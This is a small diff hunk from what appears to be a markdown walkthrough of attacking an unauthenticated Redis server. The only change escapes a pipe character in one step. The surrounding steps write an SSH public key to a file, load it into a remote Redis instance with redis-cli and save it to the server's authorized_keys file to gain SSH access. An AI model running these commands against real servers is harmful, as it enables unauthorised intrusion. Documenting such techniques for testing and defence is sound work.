@@ -36,7 +36,7 @@ OK
 
 2. Write the public key to a file : **(echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt**
 
-3. Import the file into redis : **cat foo.txt | redis-cli -h 10.85.0.52 -x set crackit**
+3. Import the file into redis : **cat foo.txt \| redis-cli -h 10.85.0.52 -x set crackit**
 
 4. Save the public key to the authorized_keys file on redis server : 
 
